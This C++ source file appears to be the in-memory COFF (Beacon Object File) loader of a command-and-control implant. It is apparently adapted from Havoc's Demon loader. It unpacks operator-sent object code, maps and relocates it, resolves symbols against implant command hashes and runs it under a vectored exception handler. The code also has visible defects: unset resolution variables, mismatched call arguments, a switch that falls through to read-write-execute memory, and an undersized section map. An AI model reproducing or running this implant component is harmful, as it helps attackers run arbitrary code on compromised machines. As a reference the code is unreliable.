#include <core/include/objects.hpp>

FUNCTION LPVOID ExceptionReturn = nullptr;

_hash_map wrappers[] = {
    { .name = 0, .address = nullptr }
};

namespace Objects {

    LONG WINAPI Debugger(const EXCEPTION_POINTERS* exception) {

        exception->ContextRecord->IP_REG = U_PTR(ExceptionReturn);
        ntstatus = exception->ExceptionRecord->ExceptionCode;

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    BOOL ResolveSymbol(_executable* object, uint8_t* func_name, void** function) {
        // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/CoffeeLdr.c

        uint32_t    type    = 0;
        uint32_t    func    = 0;
        uint32_t    lib     = 0;
        bool        success = true;


        if (type == COFF_HEXANE_HASH) {
            *function = R_CAST(void*, Commands::GetCommandAddress(func));

        }
        else if (type == COFF_IMPL_HASH) {
            for (auto i = 0;; i++) {

                if (!wrappers[i].name) {
                    success_(false);
                }

                if (wrappers[i].name == func) {
                    *function = C_PTR(wrappers[i].address);
                    success_(true);
                }
            }
        }
        else if (type == COFF_INCL_HASH) {
            x_memcpy(&lib, func_name + (sizeof(uint32_t) * 2), sizeof(uint32_t));
            C_PTR_HASHES(*function, lib, func);

            if (!*function) {
                success_(false);
            }
        }
        else {
            success_(false);
        }

        defer:
        return success;
    }

    SIZE_T GetFunctionMapSize(_executable* object) {

        const _symbol   *symbol         = { };
        const char      *symbol_name    = { };

        uint32_t        n_funcs         = 0;
        char            buffer[9]       = { };

        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
            object->section = SECTION_HEADER(object->buffer, sec_index);
            object->reloc   = RELOC_SECTION(object->buffer, object->section->PointerToRelocations);

            for (auto j = 0; j < object->section->NumberOfRelocations; j++) {
                symbol = &object->symbol[object->reloc->SymbolTableIndex];

                if (!symbol->First.Value[0]) {
                    symbol_name = R_CAST(char*, object->symbol + object->nt_head->FileHeader.NumberOfSymbols);
                }
                else {
                    x_memset(buffer, 0, sizeof(buffer));
                    x_memcpy(buffer, symbol->First.Name, 8);

                    symbol_name = buffer;
                }

                if (symbol_name) {
                    n_funcs++;
                }

                object->reloc = object->reloc + sizeof(_reloc);
            }
        }

        return sizeof(void*) * n_funcs;
    }

    BOOL BaseRelocation(_executable* object) {

        _symbol     *symbol         = { };
        char        symbol_name[9]  = { };
        char        *entry_name     = { };

        uint32_t    count           = 0;
        void        *function       = { };
        bool        success         = true;

        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
            object->section = SECTION_HEADER(object->buffer, sec_index);
            object->reloc   = RELOC_SECTION(object->buffer, object->section->PointerToRelocations);

            for (auto rel_index = 0; rel_index < object->section->NumberOfRelocations; rel_index++) {
                symbol = &object->symbol[object->reloc->SymbolTableIndex];

                if (!symbol->First.Value[0]) {
                    entry_name = R_CAST(char*, B_PTR(object->symbol) + object->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
                }
                else {
                    x_memset(symbol_name, 0, sizeof(symbol_name));
                    x_memcpy(symbol_name, symbol->First.Name, 8);

                    entry_name = symbol_name;
                }

                void* target    = object->sec_map[symbol->SectionNumber - 1].address;
                void* reloc     = object->sec_map[rel_index].address + object->reloc->VirtualAddress;
                void* map       = object->fn_map + sizeof(void*) * count;

                if (!ResolveSymbol(object, entry_name, symbol->Type, &function)) {
                    success_(false);
                }

                if (function)
#ifdef _WIN64
                {
                    if (object->reloc->Type == IMAGE_REL_AMD64_REL32) {
                        *R_CAST(void**, map) = function;
                        *S_CAST(uint32_t*, reloc) = U_PTR(function) - U_PTR(reloc) - sizeof(uint32_t);

                        count++;
                    }
                }
                else {
                    if (object->reloc->Type == IMAGE_REL_AMD64_REL32 || object->reloc->Type == IMAGE_REL_AMD64_ADDR32NB) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t);
                    }
                    else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_1) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 1;
                    }
                    else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_2) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 2;
                    }
                    else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_3) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 3;
                    }
                    else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_4) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 4;
                    }
                    else if (object->reloc->Type == IMAGE_REL_AMD64_REL32_5) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t) - 5;
                    }
                    else if (object->reloc->Type == IMAGE_REL_AMD64_ADDR64) {
                        *S_CAST(uint64_t*, reloc) = *S_CAST(uint64_t*, reloc) + U_PTR(target);
                    }
                }
#else
                {
                    if (object->reloc->Type == IMAGE_REL_I386_REL32) {
                        *S_CAST(void**, map)        = function;
                        *S_CAST(uint32_t*, reloc)   = U_PTR(map);

                        count++;
                    }
                } else {
                    if (object->reloc->Type == IMAGE_REL_I386_REL32) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target) - U_PTR(reloc) - sizeof(uint32_t);

                    } else if (object->reloc->Type == IMAGE_REL_I386_DIR32) {
                        *S_CAST(uint32_t*, reloc) = *S_CAST(uint32_t*, reloc) + U_PTR(target);
                    }
                }
#endif
                object->reloc = R_CAST(_reloc*, (U_PTR(object->reloc) + sizeof(_reloc)));
            }
        }

    defer:
        return success;
    }

    BOOL MapSections(_executable* object, const uint8_t* const data) {

        uint8_t* next = { };

        object->fn_map->size = GetFunctionMapSize(object);
        object->sec_map = R_CAST(_object_map*, x_malloc(sizeof(_object_map)));

        x_assert(object->sec_map);

        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
            object->section = SECTION_HEADER(data, sec_index);
            object->size    = R_CAST(size_t, PAGE_ALIGN(object->size)) + object->section->SizeOfRawData;
        }

        object->size += object->fn_map->size;
        x_ntassert(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->buffer), NULL, &object->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

        next = object->buffer;
        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
            object->section                     = SECTION_HEADER(object->buffer, sec_index);
            object->sec_map[sec_index].size     = object->section->SizeOfRawData;
            object->sec_map[sec_index].address  = next;

            next += object->section->SizeOfRawData;
            next = PAGE_ALIGN(next);

            x_memcpy(object->sec_map[sec_index].address, C_PTR(U_PTR(data) + object->section->PointerToRawData), object->section->SizeOfRawData);
        }

        object->fn_map = R_CAST(_object_map*, next);

    defer:
        if (ntstatus != ERROR_SUCCESS) {
            return false;
        }

        return true;
    }

    BOOL ExecuteObject(_executable *object, const char *entrypoint, char *args, uint32_t size, uint32_t req_id) {

        bool success        = false;
        char *symbol_name   = { };
        void *veh_handler   = { };
        void *exec          = { };

        x_assert(veh_handler = Ctx->nt.RtlAddVectoredExceptionHandler(1, &Memory::Execute::Debugger));

        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
            object->section = SECTION_HEADER(object->buffer, sec_index);

            if (object->section->SizeOfRawData > 0) {
                uint32_t protection = 0;

                switch (object->section->Characteristics & IMAGE_SCN_MEM_RWX) {
                    case NULL:                  protection = PAGE_NOACCESS;
                    case IMAGE_SCN_MEM_READ:    protection = PAGE_READONLY;
                    case IMAGE_SCN_MEM_RX:      protection = PAGE_EXECUTE_READ;
                    case IMAGE_SCN_MEM_RW:      protection = PAGE_READWRITE;
                    case IMAGE_SCN_MEM_WRITE:   protection = PAGE_WRITECOPY;
                    case IMAGE_SCN_MEM_XCOPY:   protection = PAGE_EXECUTE_WRITECOPY;
                    default:                    protection = PAGE_EXECUTE_READWRITE;
                }

                if ((object->section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) == IMAGE_SCN_MEM_NOT_CACHED) {
                    protection |= PAGE_NOCACHE;
                }

                x_ntassert(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->sec_map[sec_index].address), &object->sec_map[sec_index].size, protection, nullptr));
            }
        }

        if (object->fn_map->size) {
            x_ntassert(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->fn_map), &object->fn_map->size, PAGE_READONLY, nullptr));
        }

        for (auto sym_index = 0; sym_index < object->nt_head->FileHeader.NumberOfSymbols; sym_index++) {
            if (object->symbol[sym_index].First.Value[0]) {
                symbol_name = object->symbol[sym_index].First.Name;
            }
            else {
                symbol_name = R_CAST(char*, object->symbol + object->nt_head->FileHeader.NumberOfSymbols + object->symbol[sym_index].First.Value[1]);
            }
#if _M_IX86
            if (symbol_name[0] == 0x5F) {
                    symbol_name++;
                }
#endif
            if (x_memcmp(symbol_name, entrypoint, x_strlen(entrypoint)) == 0) {
                x_assert(exec = object->sec_map[object->symbol[sym_index].SectionNumber - 1].address + object->symbol[sym_index].Value);
            }
        }


        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
            if (U_PTR(exec) >= SEC_START(object->sec_map, sec_index) && U_PTR(exec) < SEC_END(object->sec_map, sec_index)) {
                object->section = SECTION_HEADER(object->buffer, sec_index);

                if ((object->section->Characteristics & IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE) {
                    success = true;
                }

                break;
            }
        }

        if (success) {
            const auto entry    = R_CAST(obj_entry, exec);
            ExceptionReturn     = __builtin_extract_return_addr(__builtin_return_address(0));
            entry(args, size);
        }

        defer:
        if (veh_handler) { Ctx->nt.RtlRemoveVectoredExceptionHandler(veh_handler); }
        return success;
    }

    VOID LoadObject(_parser parser) {

        _executable *object     = { };
        uint8_t     *data       = { };
        uint8_t     *args       = { };
        char        *entrypoint = { };

        uint32_t    arg_size    = 0;
        uint32_t    req_id      = 0;

        // object execute is : in/out, pid, tid, msg_type, entrypoint, img_data, img_args
        entrypoint = Parser::UnpackString(&parser, nullptr);
        data = Parser::UnpackBytes(&parser, nullptr);
        args = Parser::UnpackBytes(&parser, &arg_size);
        object = Memory::Methods::CreateImageData(B_PTR(data));

        object->next = Ctx->coffs;
        Ctx->coffs = object;

        x_assert(Opsec::ImageCheckArch(object));
        x_assert(Objects::MapSections(object, data));
        x_assert(Objects::BaseRelocation(object));
        x_assert(Memory::Execute::ExecuteObject(object, entrypoint, R_CAST(char*, args), arg_size, req_id));

    defer:
        if (ntstatus != ERROR_SUCCESS) {
            Ctx->nt.RtlFreeHeap(Ctx->heap, 0, &object);
        }
    }
}
